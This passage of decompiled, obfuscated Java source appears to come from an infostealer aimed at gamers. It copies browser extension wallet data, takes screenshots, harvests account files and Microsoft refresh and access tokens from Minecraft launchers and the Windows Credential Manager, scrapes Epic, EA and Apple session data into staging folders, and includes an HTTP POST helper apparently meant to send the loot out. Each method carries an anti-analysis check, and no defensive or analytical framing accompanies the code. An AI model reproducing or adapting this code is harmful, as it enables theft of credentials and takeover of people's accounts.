                  Iterator var6 = var5.iterator();

                  while (var6.hasNext()) {
                     String var7 = (String)var6.next();
                     Iterator var8 = sage.keySet().iterator();

                     while (var8.hasNext()) {
                        String var9 = (String)var8.next();
                        if (java.nio.file.Files.isDirectory(java.nio.file.Paths.get(new StringBuilder().append(var4).append("\\").append(var7).append("\\Local Extension Settings\\").append(var9).toString(), new String[0]), new LinkOption[0])) {
                           File var10 = new File(var1, new StringBuilder().append((String)sage.get(var9)).append("_").append((String)reveal.get(var4)).append("_").append(var7).append("_").append(var9).toString());
                           FileUtils.copyDirectory(
                              new File(new StringBuilder().append(var4).append("\\").append(var7).append("\\Local Extension Settings\\").append(var9).toString()),
                              var10
                           );
                           if (var10.list().length
                              > 0) {
                              var2 = true;
                           }
                        }
                     }
                  }
               }
            }

            if (!var2) {
               var1.delete();
            }
         } catch (Exception var11) {
            var11.printStackTrace();
         }
      }
   }

   public static void opoopb() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         Dimension var0 = java.awt.Toolkit.getDefaultToolkit().getScreenSize();
         Rectangle var1 = new java.awt.Rectangle(var0);
         Robot var2 = new java.awt.Robot();
         BufferedImage var3 = var2.createScreenCapture(var1);
         new java.util.Random().nextInt();
         javax.imageio.ImageIO.write(var3, "png", new File(new StringBuilder().append(lantern).append("\\screenshit.png").toString()));
         System.out.println("Get screenshot");
      } catch (Exception var4) {
         ugdymr(
            var4,
            "in taking a screenshot????????????? (no fucking idea pls report this)"
         );
      }
   }

   public static void hsslfi(String var0, String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         File var2 = new File(orient);
         if (var2.exists()
            && var2.isDirectory()) {
            File[] var3 = var2.listFiles(File::isDirectory);
            if (var3 != null) {
               for (File var7 : var3) {
                  File var8 = new File(var7, var0);
                  if (var8.exists()) {
                     java.nio.file.Files.copy(var8.toPath(), java.nio.file.Paths.get(paprika, new String[]{
                              new StringBuilder().append(var1).append("_CurseForge_").append(var7.getName()).append(".json").toString()
                           }), new CopyOption[]{
                           java.nio.file.StandardCopyOption.REPLACE_EXISTING
                        });
                     bishop = Boolean.valueOf(true);
                  }
               }
            }
         }
      } catch (Exception var9) {
         var9.printStackTrace();
      }
   }

   public static void ukceai(String var0, String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      File var2 = new File(hunter);
      if (var2.exists()
         && var2.isDirectory()) {
         File[] var3 = var2.listFiles(File::isDirectory);
         if (var3 != null) {
            for (File var7 : var3) {
               File var8 = new File(var7, ".minecraft");
               if (var8.exists()
                  && var8.isDirectory()) {
                  File var9 = new File(var8, var0);
                  if (var9.exists()) {
                     try {
                        java.nio.file.Files.copy(var9.toPath(), java.nio.file.Paths.get(paprika, new String[]{
                                 new StringBuilder().append(var1).append("_").append(var7.getName()).append(".json").toString()
                              }), new CopyOption[]{
                              java.nio.file.StandardCopyOption.REPLACE_EXISTING
                           });
                        bishop = Boolean.valueOf(true);
                     } catch (IOException var11) {
                        var11.printStackTrace();
                     }
                  }
               }
            }
         }
      }
   }

   public static void xckupu(String var0, String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      File var2 = new File(signal);
      if (var2.exists()
         && var2.isDirectory()) {
         File[] var3 = var2.listFiles(File::isDirectory);
         if (var3 != null) {
            for (File var7 : var3) {
               File var8 = new File(var7, "minecraft");
               if (var8.exists()
                  && var8.isDirectory()) {
                  File var9 = new File(var8, var0);
                  if (var9.exists()) {
                     try {
                        java.nio.file.Files.copy(var9.toPath(), java.nio.file.Paths.get(paprika, new String[]{
                                 new StringBuilder().append(var1).append("_").append(var7.getName()).append(".json").toString()
                              }), new CopyOption[]{
                              java.nio.file.StandardCopyOption.REPLACE_EXISTING
                           });
                        bishop = Boolean.valueOf(true);
                     } catch (IOException var11) {
                        var11.printStackTrace();
                     }
                  }
               }
            }
         }
      }
   }

   public static void rxbcwq() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      hsslfi("config\\ias.json", "ias");
      ukceai("config\\ias.json", "ias");
      xckupu("config\\ias.json", "ias");
   }

   public static void llllpt() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      hsslfi(
         "essential\\microsoft_accounts.json",
         "essential"
      );
      ukceai(
         "essential\\microsoft_accounts.json",
         "essential"
      );
      xckupu(
         "essential\\microsoft_accounts.json",
         "essential"
      );
   }

   public void wrvcdg() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var1 = new StringBuilder().append(System.getProperty("user.home")).append("\\.lunarclient\\settings\\game\\accounts.json").toString();
      if (new File(var1).exists()) {
         System.out.println("Find Lunar");

         try {
            java.nio.file.Files.walk(java.nio.file.Paths.get(var1, new String[0]), new FileVisitOption[0]).forEach(var1x -> {
                  if (rkjsezrwcf.jzdety() != 0) {
                     rkjsezrwcf.bbsnvj();
                  }

                  try {
                     Path var2 = java.nio.file.Paths.get(new StringBuilder().append(paprika).append("\\Lunar.json").toString(), new String[0]).resolve(java.nio.file.Paths.get(var1, new String[0]).relativize(var1x));
                     if (java.nio.file.Files.isDirectory(var1x, new LinkOption[0])) {
                        if (!java.nio.file.Files.exists(var2, new LinkOption[0])) {
                           java.nio.file.Files.createDirectory(var2, new FileAttribute[0]);
                           return;
                        }

                        return;
                     }

                     java.nio.file.Files.copy(var1x, var2, new CopyOption[]{
                           java.nio.file.StandardCopyOption.REPLACE_EXISTING
                        });
                     bishop = Boolean.valueOf(true);
                  } catch (IOException var3x) {
                     var3x.printStackTrace();
                  }
               });
         } catch (Exception var3) {
            var3.printStackTrace();
         }
      }
   }

   public void kkcmcc() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var1 = new StringBuilder().append(pebble).append("\\.feather\\accounts.json").toString();
      if (new File(var1).exists()) {
         System.out.println("Find Feather");

         try {
            java.nio.file.Files.walk(java.nio.file.Paths.get(var1, new String[0]), new FileVisitOption[0]).forEach(var1x -> {
                  if (rkjsezrwcf.jzdety() != 0) {
                     rkjsezrwcf.bbsnvj();
                  }

                  try {
                     Path var2 = java.nio.file.Paths.get(new StringBuilder().append(paprika).append("\\Feather.json").toString(), new String[0]).resolve(java.nio.file.Paths.get(var1, new String[0]).relativize(var1x));
                     if (java.nio.file.Files.isDirectory(var1x, new LinkOption[0])) {
                        if (!java.nio.file.Files.exists(var2, new LinkOption[0])) {
                           java.nio.file.Files.createDirectory(var2, new FileAttribute[0]);
                           return;
                        }

                        return;
                     }

                     java.nio.file.Files.copy(var1x, var2, new CopyOption[]{
                           java.nio.file.StandardCopyOption.REPLACE_EXISTING
                        });
                     bishop = Boolean.valueOf(true);
                  } catch (IOException var3x) {
                     var3x.printStackTrace();
                  }
               });
         } catch (Exception var3) {
            var3.printStackTrace();
         }
      }
   }

   public void nqnefh() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var1 = new StringBuilder().append(pebble).append("\\PrismLauncher\\accounts.json").toString();
      if (new File(var1).exists()) {
         System.out.println("Find PrismLauncher");

         try {
            java.nio.file.Files.walk(java.nio.file.Paths.get(var1, new String[0]), new FileVisitOption[0]).forEach(var1x -> {
                  if (rkjsezrwcf.jzdety() != 0) {
                     rkjsezrwcf.bbsnvj();
                  }

                  try {
                     Path var2 = java.nio.file.Paths.get(new StringBuilder().append(paprika).append("\\PrismLauncher.json").toString(), new String[0]).resolve(java.nio.file.Paths.get(var1, new String[0]).relativize(var1x));
                     if (java.nio.file.Files.isDirectory(var1x, new LinkOption[0])) {
                        if (!java.nio.file.Files.exists(var2, new LinkOption[0])) {
                           java.nio.file.Files.createDirectory(var2, new FileAttribute[0]);
                           return;
                        }

                        return;
                     }

                     java.nio.file.Files.copy(var1x, var2, new CopyOption[]{
                           java.nio.file.StandardCopyOption.REPLACE_EXISTING
                        });
                     bishop = Boolean.valueOf(true);
                  } catch (IOException var3x) {
                     var3x.printStackTrace();
                  }
               });
         } catch (Exception var3) {
            var3.printStackTrace();
         }
      }
   }

   public void xbapjz() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var1 = new StringBuilder().append(System.getProperty("user.home")).append("\\Downloads\\MultiMC\\accounts.json").toString();
      if (new File(var1).exists()) {
         System.out.println("Find MultiMC");

         try {
            java.nio.file.Files.walk(java.nio.file.Paths.get(var1, new String[0]), new FileVisitOption[0]).forEach(var1x -> {
                  if (rkjsezrwcf.jzdety() != 0) {
                     rkjsezrwcf.bbsnvj();
                  }

                  try {
                     Path var2 = java.nio.file.Paths.get(new StringBuilder().append(paprika).append("\\MultiMC.json").toString(), new String[0]).resolve(java.nio.file.Paths.get(var1, new String[0]).relativize(var1x));
                     if (java.nio.file.Files.isDirectory(var1x, new LinkOption[0])) {
                        if (!java.nio.file.Files.exists(var2, new LinkOption[0])) {
                           java.nio.file.Files.createDirectory(var2, new FileAttribute[0]);
                           return;
                        }

                        return;
                     }

                     java.nio.file.Files.copy(var1x, var2, new CopyOption[]{
                           java.nio.file.StandardCopyOption.REPLACE_EXISTING
                        });
                     bishop = Boolean.valueOf(true);
                  } catch (IOException var3x) {
                     var3x.printStackTrace();
                  }
               });
         } catch (Exception var3) {
            var3.printStackTrace();
         }
      }
   }

   public void mdzfhk() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      sinkcf();
      String[] var1 = new String[]{
         new StringBuilder().append(System.getProperty("user.home")).append("\\curseforge\\minecraft\\Install\\launcher_accounts.json").toString(),
         new StringBuilder().append(System.getenv("APPDATA")).append("\\curseforge\\minecraft\\Install\\launcher_accounts.json").toString()
      };
      File var2 = null;

      for (String var6 : var1) {
         if (var6 != null
            && new File(var6).exists()) {
            var2 = new File(var6);
            break;
         }
      }

      if (var2 != null) {
         System.out.println("Find CurseForge");

         try {
            String var14 = new String(java.nio.file.Files.readAllBytes(var2.toPath()), java.nio.charset.StandardCharsets.UTF_8);
            JsonElement var15 = new JsonParser().parse(var14);
            ArrayList var16 = new java.util.ArrayList();
            if (var15.isJsonObject()) {
               JsonObject var17 = var15.getAsJsonObject();
               if (var17.has("accounts")) {
                  JsonElement var7 = var17.get("accounts");
                  if (var7.isJsonObject()) {
                     Iterator var20 = var7.getAsJsonObject().entrySet().iterator();

                     while (var20.hasNext()) {
                        Entry var22 = (Entry)var20.next();
                        Map var23 = rsgcsl(
                           (String)var22.getKey(),
                           (JsonElement)var22.getValue()
                        );
                        if (var23 != null) {
                           var16.add(var23);
                        }
                     }
                  } else if (var7.isJsonArray()) {
                     Iterator var8 = var7.getAsJsonArray().iterator();

                     while (var8.hasNext()) {
                        JsonElement var9 = (JsonElement)var8.next();
                        Map var10 = rsgcsl(null, var9);
                        if (var10 != null) {
                           var16.add(var10);
                        }
                     }
                  }
               }
            }

            if (var16.isEmpty()) {
               zdolbx(var2);
               return;
            }

            java.nio.file.Files.createDirectories(java.nio.file.Paths.get(paprika, new String[0]), new FileAttribute[0]);
            Path var18 = java.nio.file.Paths.get(paprika, new String[]{"CurseForge.json"});
            Gson var19 = new GsonBuilder().setPrettyPrinting().create();
            BufferedWriter var21 = java.nio.file.Files.newBufferedWriter(var18, java.nio.charset.StandardCharsets.UTF_8, new OpenOption[]{
                  java.nio.file.StandardOpenOption.CREATE,
                  java.nio.file.StandardOpenOption.TRUNCATE_EXISTING
               });

            try {
               var19.toJson(var16, var21);
            } catch (Throwable var12) {
               if (var21 != null) {
                  try {
                     var21.close();
                  } catch (Throwable var11) {
                     var12.addSuppressed(var11);
                  }
               }

               throw var12;
            }

            if (var21 != null) {
               var21.close();
            }

            bishop = Boolean.valueOf(true);
            System.out.println(new StringBuilder().append("CurseForge accounts exported to: ").append(var18).toString());
         } catch (Exception var13) {
            var13.printStackTrace();
            zdolbx(var2);
         }
      }
   }

   private static Map<String, Object> rsgcsl(String var0, JsonElement var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (var1 != null && var1.isJsonObject()) {
         JsonObject var2 = var1.getAsJsonObject();
         LinkedHashMap var3 = new java.util.LinkedHashMap();
         var3.put("accountId", var0);
         var3.put("username", vtugld(var2, "username"));
         var3.put("email", vtugld(var2, "email"));
         var3.put("accessToken", vtugld(var2, "accessToken"));
         var3.put("refreshToken", vtugld(var2, "refreshToken"));
         var3.put("type", vtugld(var2, "type"));
         if (var2.has("minecraftProfile")
            && var2.get("minecraftProfile").isJsonObject()) {
            JsonObject var4 = var2.getAsJsonObject("minecraftProfile");
            var3.put("uuid", vtugld(var4, "id"));
            var3.put("displayName", vtugld(var4, "name"));
         } else {
            var3.put("uuid", vtugld(var2, "uuid"));
         }

         return var3;
      } else {
         return null;
      }
   }

   private static String vtugld(JsonObject var0, String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      return var0.has(var1) && !var0.get(var1).isJsonNull() ? var0.get(var1).getAsString() : null;
   }

   private static void zdolbx(File var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         java.nio.file.Files.createDirectories(java.nio.file.Paths.get(paprika, new String[0]), new FileAttribute[0]);
         java.nio.file.Files.copy(var0.toPath(), java.nio.file.Paths.get(paprika, new String[]{"CurseForge.json"}), new CopyOption[]{
               java.nio.file.StandardCopyOption.REPLACE_EXISTING
            });
         bishop = Boolean.valueOf(true);
      } catch (IOException var2) {
      }
   }

   public static void sinkcf() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      tbncvm(
         new String[]{
            new StringBuilder().append(System.getProperty("user.home")).append("\\curseforge\\minecraft\\Install\\launcher_msa_credentials.bin").toString(),
            new StringBuilder().append(System.getenv("APPDATA")).append("\\curseforge\\minecraft\\Install\\launcher_msa_credentials.bin").toString()
         },
         "CurseForge_msa.json"
      );
   }

   public static void amwmea() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      tbncvm(
         new String[]{
            new StringBuilder().append(System.getenv("APPDATA")).append("\\.minecraft\\launcher_msa_credentials.bin").toString(),
            new StringBuilder().append(System.getenv("APPDATA")).append("\\.minecraft\\launcher_msa_credentials_microsoft_store.bin").toString()
         },
         "Minecraft_msa.json"
      );
      qmdpth(
         "Minecraft_msa_credentials.json"
      );
   }

   private static void tbncvm(String[] var0, String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      File var2 = null;

      for (String var6 : var0) {
         if (var6 != null
            && new File(var6).exists()) {
            var2 = new File(var6);
            break;
         }
      }

      if (var2 != null) {
         try {
            byte[] var23 = cerlsf(
               java.nio.file.Files.readAllBytes(var2.toPath())
            );
            JSONObject var24 = new JSONObject(
               new String(var23, java.nio.charset.StandardCharsets.UTF_8)
            );
            JSONObject var25 = var24.optJSONObject("credentials");
            if (var25 == null) {
               return;
            }

            ArrayList var26 = new java.util.ArrayList();
            Iterator var7 = var25.keys();

            while (var7.hasNext()) {
               String var8 = (String)var7.next();
               JSONObject var9 = var25.optJSONObject(var8);
               if (var9 != null) {
                  Iterator var10 = var9.keys();

                  while (var10.hasNext()) {
                     String var11 = (String)var10.next();
                     String var12 = var9.optString(var11, null);
                     if (var12 != null) {
                        try {
                           JSONObject var13 = new JSONObject(var12);
                           String var14 = var13.optString("refresh_token", null);
                           String var15 = var13.optString("user_id", null);
                           String var16 = null;
                           JSONArray var17 = var13.optJSONArray("access_tokens");
                           if (var17 != null && var17.length() > 0) {
                              JSONObject var18 = var17.optJSONObject(0);
                              if (var18 != null) {
                                 var16 = var18.optString("access_token", null);
                              }
                           }

                           if (var14 != null || var16 != null) {
                              LinkedHashMap var30 = new java.util.LinkedHashMap();
                              var30.put("xuid", var8);
                              var30.put("user_id", var15);
                              var30.put("key", var11);
                              var30.put("refresh_token", var14);
                              var30.put("access_token", var16);
                              var26.add(var30);
                           }
                        } catch (JSONException var21) {
                        }
                     }
                  }
               }
            }

            if (var26.isEmpty()) {
               return;
            }

            java.nio.file.Files.createDirectories(java.nio.file.Paths.get(paprika, new String[0]), new FileAttribute[0]);
            Path var27 = java.nio.file.Paths.get(paprika, new String[]{var1});
            Gson var28 = new GsonBuilder().setPrettyPrinting().create();
            BufferedWriter var29 = java.nio.file.Files.newBufferedWriter(var27, java.nio.charset.StandardCharsets.UTF_8, new OpenOption[]{
                  java.nio.file.StandardOpenOption.CREATE,
                  java.nio.file.StandardOpenOption.TRUNCATE_EXISTING
               });

            try {
               var28.toJson(var26, var29);
            } catch (Throwable var20) {
               if (var29 != null) {
                  try {
                     var29.close();
                  } catch (Throwable var19) {
                     var20.addSuppressed(var19);
                  }
               }

               throw var20;
            }

            if (var29 != null) {
               var29.close();
            }

            bishop = Boolean.valueOf(true);
            System.out.println(new StringBuilder().append("MSA exported to: ").append(var27).toString());
         } catch (Exception var22) {
            System.out.println(new StringBuilder().append("[MSA] error: ").append(var22.getMessage()).toString());
         }
      }
   }

   private static void qmdpth(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      IntByReference var1 = new IntByReference();
      PointerByReference var2 = new PointerByReference();

      try {
         if (!sturdy.INSTANCE.CredEnumerateW(new WString("MCL*"), 0, var1, var2)) {
            return;
         }

         int var3 = var1.getValue();
         Pointer var4 = var2.getValue();
         if (var3 <= 0 || var4 == null) {
            if (var4 != null) {
               sturdy.INSTANCE.CredFree(var4);
            }

            return;
         }

         ArrayList var5 = new java.util.ArrayList();

         for (int var6 = 0; var6 < var3; var6++) {
            Pointer var7 = var4.getPointer((long)var6 * Native.POINTER_SIZE);
            if (var7 != null) {
               try {
                  spring var8 = new spring(var7);
                  var8.read();
                  String var9 = var8.TargetName == null ? null : var8.TargetName.toString();
                  int var10 = var8.CredentialBlobSize;
                  Pointer var11 = var8.CredentialBlob;
                  if (var9 != null
                     && var10 > 0
                     && var11 != null
                     && var9.contains("Msa")) {
                     byte[] var12 = var11.getByteArray(0L, var10);
                     Map var13 = jxyybg(var12, var9);
                     if (var13 != null) {
                        var5.add(var13);
                     }
                  }
               } catch (Exception var15) {
               }
            }
         }

         sturdy.INSTANCE.CredFree(var4);
         if (var5.isEmpty()) {
            return;
         }

         java.nio.file.Files.createDirectories(java.nio.file.Paths.get(paprika, new String[0]), new FileAttribute[0]);
         Path var18 = java.nio.file.Paths.get(paprika, new String[]{var0});
         Gson var19 = new GsonBuilder().setPrettyPrinting().create();
         BufferedWriter var20 = java.nio.file.Files.newBufferedWriter(var18, java.nio.charset.StandardCharsets.UTF_8, new OpenOption[]{
               java.nio.file.StandardOpenOption.CREATE,
               java.nio.file.StandardOpenOption.TRUNCATE_EXISTING
            });

         try {
            var19.toJson(var5, var20);
         } catch (Throwable var16) {
            if (var20 != null) {
               try {
                  var20.close();
               } catch (Throwable var14) {
                  var16.addSuppressed(var14);
               }
            }

            throw var16;
         }

         if (var20 != null) {
            var20.close();
         }

         bishop = Boolean.valueOf(true);
         System.out.println(new StringBuilder().append("Credential Manager MSA exported to: ").append(var18).toString());
      } catch (Exception var17) {
         System.out.println(new StringBuilder().append("[CredMgr] error: ").append(var17.getMessage()).toString());
      }
   }

   private static Map<String, Object> jxyybg(byte[] var0, String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      int var2 = -1;

      for (int var3 = 0; var3 < var0.length; var3++) {
         if (var0[var3] == 123) {
            var2 = var3;
            break;
         }
      }

      if (var2 < 0) {
         return null;
      }

      try {
         String var11 = new String(var0, var2, var0.length - var2, java.nio.charset.StandardCharsets.UTF_8);
         JSONObject var4 = new JSONObject(var11);
         String var5 = var4.optString("refresh_token", null);
         String var6 = var4.optString("user_id", null);
         String var7 = null;
         JSONArray var8 = var4.optJSONArray("access_tokens");
         if (var8 != null && var8.length() > 0) {
            JSONObject var9 = var8.optJSONObject(0);
            if (var9 != null) {
               var7 = var9.optString("access_token", null);
            }
         }

         if (var5 == null && var7 == null) {
            return null;
         }

         LinkedHashMap var12 = new java.util.LinkedHashMap();
         var12.put("target", var1);
         var12.put("user_id", var6);
         var12.put("refresh_token", var5);
         var12.put("access_token", var7);
         return var12;
      } catch (JSONException var10) {
         return null;
      }
   }

   public static void xdufbx() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         String[] var0 = new String[]{
            new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini").toString(),
            new StringBuilder().append(System.getenv("APPDATA")).append("\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini").toString()
         };
         File var1 = null;

         for (String var5 : var0) {
            if (var5 != null
               && new File(var5).exists()) {
               var1 = new File(var5);
               break;
            }
         }

         if (var1 == null) {
            return;
         }

         StringBuilder var8 = new StringBuilder();
         boolean var9 = false;
         Iterator var10 = java.nio.file.Files.readAllLines(var1.toPath(), java.nio.charset.StandardCharsets.UTF_8).iterator();

         while (var10.hasNext()) {
            String var12 = (String)var10.next();
            String var6 = var12.trim();
            if (var6.startsWith("[")
               && var6.endsWith("]")) {
               var9 = var6.toLowerCase().contains("remember");
            } else if (var9
               && var6.contains("=")) {
               var8.append(var6).append("\r\n");
            }
         }

         if (var8.length() == 0) {
            var8.append(new String(java.nio.file.Files.readAllBytes(var1.toPath()), java.nio.charset.StandardCharsets.UTF_8));
         }

         if (var8.toString().trim().isEmpty()) {
            return;
         }

         Path var11 = java.nio.file.Paths.get(lantern, new String[]{"Tokens"});
         java.nio.file.Files.createDirectories(var11, new FileAttribute[0]);
         java.nio.file.Files.write(var11.resolve("Epic.txt"), var8.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8), new OpenOption[0]);
         System.out.println("[Epic] saved");
      } catch (Exception var7) {
         System.out.println(new StringBuilder().append("[Epic] error: ").append(var7.getMessage()).toString());
      }
   }

   public static void fyookr() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         String[] var0 = new String[]{
            new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\EADesktop").toString(),
            new StringBuilder().append(System.getenv("APPDATA")).append("\\EADesktop").toString(),
            new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Electronic Arts\\EA Desktop").toString(),
            new StringBuilder().append(System.getenv("APPDATA")).append("\\Origin").toString(),
            new StringBuilder().append(System.getenv("LOCALAPPDATA")).append("\\Origin").toString(),
            new StringBuilder().append(System.getenv("PROGRAMDATA")).append("\\Origin").toString()
         };
         Pattern var1 = java.util.regex.Pattern.compile("(?i)(token|auth|account|login|credential|refresh|access|entitlement|\\.json$|\\.ini$|\\.cfg$|\\.properties$)");
         StringBuilder var2 = new StringBuilder();

         for (String var6 : var0) {
            if (var6 != null) {
               File var7 = new File(var6);
               if (var7.isDirectory()) {
                  try {
                     Stream var8 = java.nio.file.Files.walk(var7.toPath(), 3, new FileVisitOption[0]);

                     try {
                        var8.filter(var0x -> {
                                       if (rkjsezrwcf.jzdety() != 0) {
                                          rkjsezrwcf.bbsnvj();
                                       }

                                       return java.nio.file.Files.isRegularFile(var0x, new LinkOption[0]);
                                    }).filter(var0x -> {
                                    if (rkjsezrwcf.jzdety() != 0) {
                                       rkjsezrwcf.bbsnvj();
                                    }

                                    return var0x.toFile().length()
                                       < (80 << 16 | (char)0);
                                 }),
                              var1x -> {
                                 if (rkjsezrwcf.jzdety() != 0) {
                                    rkjsezrwcf.bbsnvj();
                                 }

                                 return var1.matcher(var1x.getFileName().toString()).find();
                              }.filter(),
                           var1x -> {
                              if (rkjsezrwcf.jzdety() != 0) {
                                 rkjsezrwcf.bbsnvj();
                              }

                              try {
                                 var2.append("== ").append(var1x).append(" ==\r\n");
                                 var2.append(new String(java.nio.file.Files.readAllBytes(var1x), java.nio.charset.StandardCharsets.UTF_8)).append("\r\n\r\n");
                              } catch (Exception var3) {
                              }
                           }.forEach();
                     } catch (Throwable var12) {
                        if (var8 != null) {
                           try {
                              var8.close();
                           } catch (Throwable var11) {
                              var12.addSuppressed(var11);
                           }
                        }

                        throw var12;
                     }

                     if (var8 != null) {
                        var8.close();
                     }
                  } catch (Exception var13) {
                  }
               }
            }
         }

         if (var2.toString().trim().isEmpty()) {
            return;
         }

         Path var15 = java.nio.file.Paths.get(lantern, new String[]{"Tokens"});
         java.nio.file.Files.createDirectories(var15, new FileAttribute[0]);
         java.nio.file.Files.write(var15.resolve("EA.txt"), var2.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8), new OpenOption[0]);
         System.out.println("[EA] saved");
      } catch (Exception var14) {
         System.out.println(new StringBuilder().append("[EA] error: ").append(var14.getMessage()).toString());
      }
   }

   public static void qahoes() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         File var0 = new File(new StringBuilder().append(lantern).append("\\Cookies").toString());

         for (int var1 = 0;
            (
                  !var0.exists()
                     || var0.list()
                        == null
                     || var0.list().length
                        == 0
               )
               && var1 < 20;
            var1++
         ) {
            Thread.sleep(500);
         }

         Pattern var2 = java.util.regex.Pattern.compile("(?i)(X-APPLE-WEBAUTH-TOKEN|X-APPLE-DS-WEB-SESSION-TOKEN|X-APPLE-ACCESS-TOKEN|X-APPLE-SESSION-TOKEN|apple\\.com|icloud\\.com|dsid)");
         StringBuilder var3 = new StringBuilder();
         File[] var4 = var0.listFiles();
         if (var4 != null) {
            for (File var8 : var4) {
               if (var8.isFile()) {
                  try {
                     Iterator var9 = java.nio.file.Files.readAllLines(var8.toPath(), java.nio.charset.StandardCharsets.UTF_8).iterator();

                     while (var9.hasNext()) {
                        String var10 = (String)var9.next();
                        if (var2.matcher(var10).find()) {
                           var3.append(var10).append("\r\n");
                        }
                     }
                  } catch (Exception var11) {
                  }
               }
            }
         }

         if (var3.toString().trim().isEmpty()) {
            return;
         }

         Path var13 = java.nio.file.Paths.get(lantern, new String[]{"Tokens"});
         java.nio.file.Files.createDirectories(var13, new FileAttribute[0]);
         java.nio.file.Files.write(var13.resolve("Apple.txt"), var3.toString().getBytes(java.nio.charset.StandardCharsets.UTF_8), new OpenOption[0]);
         System.out.println("[Apple] saved");
      } catch (Exception var12) {
         System.out.println(new StringBuilder().append("[Apple] error: ").append(var12.getMessage()).toString());
      }
   }

   private static List<String> csfexr() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      ArrayList var0 = new java.util.ArrayList();
      IntByReference var1 = new IntByReference();
      PointerByReference var2 = new PointerByReference();

      try {
         if (!sturdy.INSTANCE.CredEnumerateW(new WString("MCL*"), 0, var1, var2)) {
            return var0;
         }

         int var3 = var1.getValue();
         Pointer var4 = var2.getValue();
         if (var3 <= 0 || var4 == null) {
            if (var4 != null) {
               sturdy.INSTANCE.CredFree(var4);
            }

            return var0;
         }

         for (int var5 = 0; var5 < var3; var5++) {
            Pointer var6 = var4.getPointer((long)var5 * Native.POINTER_SIZE);
            if (var6 != null) {
               try {
                  spring var7 = new spring(var6);
                  var7.read();
                  String var8 = var7.TargetName == null ? null : var7.TargetName.toString();
                  if (var8 != null
                     && var8.contains("Msa")
                     && var7.CredentialBlobSize > 0
                     && var7.CredentialBlob != null) {
                     byte[] var9 = var7.CredentialBlob.getByteArray(0L, var7.CredentialBlobSize);
                     Map var10 = jxyybg(var9, var8);
                     if (var10 != null
                        && var10.get("refresh_token")
                           != null) {
                        var0.add((String)var10.get("refresh_token"));
                     }
                  }
               } catch (Exception var11) {
               }
            }
         }

         sturdy.INSTANCE.CredFree(var4);
      } catch (Exception var12) {
      }

      return var0;
   }

   public static void fwgqhz() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         List var0 = csfexr();
         if (var0.isEmpty()) {
            return;
         }

         ArrayList var1 = new java.util.ArrayList();
         Iterator var2 = var0.iterator();

         while (var2.hasNext()) {
            String var3 = (String)var2.next();
            mncoul(var3, var1);
         }

         if (var1.isEmpty()) {
            return;
         }

         Path var5 = java.nio.file.Paths.get(lantern, new String[]{"Tokens"});
         java.nio.file.Files.createDirectories(var5, new FileAttribute[0]);
         java.nio.file.Files.write(var5.resolve("Xbox.txt"), var1, java.nio.charset.StandardCharsets.UTF_8, new OpenOption[0]);
         System.out.println(new StringBuilder().append("[Xbox] saved ").append(var1.size()).append(" lines").toString());
      } catch (Exception var4) {
         System.out.println(new StringBuilder().append("[Xbox] error: ").append(var4.getMessage()).toString());
      }
   }

   private static String hxyrox(String var0, String var1, String var2) throws Exception {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      HttpURLConnection var3 = cosmos(
         new URL(var0),
         "POST",
         10000,
         20000
      );
      var3.setRequestProperty("Content-Type", var2);
      var3.setRequestProperty("Accept", "application/json");
      var3.setDoOutput(true);
      OutputStream var4 = var3.getOutputStream();

      try {
         var4.write(var1.getBytes(java.nio.charset.StandardCharsets.UTF_8));
      } catch (Throwable var12) {
         if (var4 != null) {
            try {
               var4.close();
            } catch (Throwable var11) {
               var12.addSuppressed(var11);
            }
         }

         throw var12;
      }

      if (var4 != null) {
         var4.close();
      }

      int var14 = var3.getResponseCode();
      InputStream var5 = var14 >= 200 && var14 < 300
         ? var3.getInputStream()
         : var3.getErrorStream();
      StringBuilder var6 = new StringBuilder();
      if (var5 != null) {
